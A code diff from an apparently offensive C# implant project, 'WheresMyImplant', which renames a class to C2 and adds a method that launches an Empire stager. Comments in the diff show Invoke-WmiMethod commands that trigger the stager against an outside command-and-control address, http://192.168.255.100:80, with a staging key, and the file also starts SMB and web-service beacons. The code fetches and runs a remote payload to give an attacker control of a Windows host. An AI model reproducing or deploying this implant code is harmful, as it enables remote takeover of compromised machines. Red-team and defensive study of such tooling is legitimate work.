@@ -1,8 +1,10 @@
 ﻿using System;
 
+using Empire;
+
 namespace WheresMyImplant
 {
-    public partial class Implant
+    public class C2
     {
         //FormalChicken
         public static void StartSmbServer(String pipeName)
@@ -39,6 +41,21 @@ namespace WheresMyImplant
                 Console.WriteLine("Starting Web Servic Beacon");
                 webServiceBeacon.SetRetries(retriesCount);
                 webServiceBeacon.Run();
+            }
+        }
+
+        //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "powershell","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
+        //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "dotnet","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
+        public static void Empire(String server, String stagingKey, String language)
+        {
+            try
+            {
+                EmpireStager empireStager = new EmpireStager(server, stagingKey, language);
+                empireStager.execute();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] {0}", ex.Message);
             }
         }
     }
